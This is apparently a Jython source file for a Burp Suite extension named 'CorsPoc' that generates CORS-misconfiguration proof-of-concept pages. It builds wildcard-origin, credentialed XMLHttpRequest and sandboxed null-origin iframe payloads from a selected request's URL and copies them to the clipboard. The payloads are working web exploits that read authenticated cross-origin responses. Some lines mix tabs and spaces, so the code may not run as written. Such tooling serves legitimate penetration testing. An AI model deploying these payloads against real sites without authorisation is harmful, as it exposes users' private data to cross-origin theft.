from burp import IBurpExtender, IContextMenuFactory
from java.util import ArrayList
from javax.swing import JMenuItem, JMenu
from java.io import PrintWriter
from java.awt.datatransfer import StringSelection
from java.awt import Toolkit

import sys, functools, inspect, traceback, json

class BurpExtender(IBurpExtender, IContextMenuFactory):

    def registerExtenderCallbacks(self, callbacks):

        self._stdout = PrintWriter(callbacks.getStdout(), True)
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._callbacks.setExtensionName("CorsPoc")
        self._callbacks.registerContextMenuFactory(self)

        return

    def createMenuItems(self, invocation):
        self._context = invocation
        menuList = ArrayList()

        parentMenu = JMenu('CorsPoc')

        menuItemWildCard = JMenuItem("WildCard", actionPerformed=self.asWildCard)
        menuItemBasicPoc = JMenuItem("BasicPoc", actionPerformed=self.asBasicPoc)
        menuItemnullOrigin = JMenuItem("nullOrigin", actionPerformed=self.asnullOrigin)

        parentMenu.add(menuItemWildCard)
        parentMenu.add(menuItemBasicPoc)
        parentMenu.add(menuItemnullOrigin)
        menuList.add(parentMenu)

        # Request info
        iRequestInfo = self._helpers.analyzeRequest(self._context.getSelectedMessages()[0])
        self.url = iRequestInfo.getUrl().toString()
        self.payload = ''.join(map(chr, self._context.getSelectedMessages()[0].getRequest())).split('\r\n\r\n')[1]

        return menuList


    def asWildCard(self, event):
    	to_copy = "<html>\n<script>\nvar url = '{url}';\nfetch(url, {{\n\tmethod: 'GET',\n\tcache: 'force-cache'    \n\t}}).then((response) => {{    \n\treturn response.text();  \n\t}})  \n\t.then((result) => {{    \n\tdocument.write(result)  \n}});\n</script>\n</html>".format(url=self.url)
	s = StringSelection(to_copy)
        Toolkit.getDefaultToolkit().getSystemClipboard().setContents(s, s)

    def asBasicPoc(self, event):
        to_copy = "<script>\n\tvar xhttp = new XMLHttpRequest();\n\txhttp.onreadystatechange = function() {{\n\tif (this.readyState == 4 && this.status == 200) {{ \n\talert(this.responseText); \n\t}}}}; \n\txhttp.open('GET', '{url}', true);\n\txhttp.withCredentials = true;\n\txhttp.send();\n</script>".format(url=self.url)
	s = StringSelection(to_copy)
        Toolkit.getDefaultToolkit().getSystemClipboard().setContents(s, s)

    def asnullOrigin(self, event):
        to_copy = "<iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" src=\"data:text/html, <script>\n\tvar xhttp = new XMLHttpRequest();\n\txhttp.onreadystatechange = function() {{\n\tif (this.readyState == 4 && this.status == 200) {{\n\talert(this.responseText);\n\t}}}};\n\txhttp.open('GET', '{url}', true);\n\txhttp.withCredentials = true;\n\txhttp.send();\n</script>\"></iframe> ".format(url=self.url)
	s = StringSelection(to_copy)
        Toolkit.getDefaultToolkit().getSystemClipboard().setContents(s, s)


